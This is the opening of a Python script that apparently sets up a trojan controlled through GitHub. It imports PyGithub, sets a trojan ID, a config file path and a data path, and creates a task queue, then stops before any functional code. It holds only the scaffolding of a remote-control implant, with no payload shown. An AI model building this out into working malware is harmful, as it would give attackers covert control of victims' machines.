import json
import base64
import sys
import time
import importlib
import random
import threading
import queue
import os

from github import Github

trojan_id = "trojan1"

trojan_config = "{}.json".format(trojan_id)
data_path = "data/{}".format(trojan_id)
trojan_modules = []
configuresd = False
task_queue = queue.Queue()